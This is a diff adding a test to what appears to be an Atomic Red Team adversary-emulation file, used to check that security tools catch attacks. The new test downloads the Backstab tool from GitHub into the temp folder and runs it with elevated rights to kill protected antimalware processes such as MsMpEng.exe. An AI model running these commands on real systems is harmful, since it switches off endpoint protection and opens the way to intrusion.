@@ -612,3 +612,24 @@ atomic_tests:
       Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
     name: powershell
     elevation_required: true
+- name: Kill antimalware protected processes using Backstab
+  description: |-
+    Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.
+    https://github.com/Yaxser/Backstab
+  supported_platforms:
+  - windows
+  input_arguments:
+    process_name:
+      description: Name of the protected process you want to kill/terminate.
+      type: string
+      default: MsMpEng.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Backstab64.exe should exist in %temp%
+    prereq_command: if (Test-Path $env:temp\Backstab64.exe) {exit 0} else {exit 1}
+    get_prereq_command: Start-BitsTransfer -Source "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -Destination "$env:temp\Backstab64.exe" -dynamic
+  executor:
+    command: '& $env:temp\Backstab64.exe -k -n #{process_name}'
+    name: powershell
+    elevation_required: true
+  
